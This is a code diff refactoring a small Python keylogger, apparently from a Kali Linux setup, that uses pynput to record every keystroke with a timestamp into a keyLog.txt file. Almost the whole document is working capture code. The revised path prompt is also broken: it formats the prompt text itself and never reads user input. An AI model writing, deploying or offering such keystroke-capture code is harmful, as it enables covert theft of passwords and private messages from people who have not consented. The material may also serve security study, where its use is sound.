@@ -1,9 +1,21 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = r"/home/kali/Desktop/"
-logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+#Function that logs each key
 def on_press(key):
     logging.info(str(key))
-with Listener(on_press=on_press) as listener:
-    listener.join()
+    
+    
+def main():
+    #Retrieve location to store log from user
+    log_dir = r"{}".format("Enter path to save keylog: ".strip())
+    logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+    #Starting keylogger
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+
+if __name__ == "__main__":
+    main()
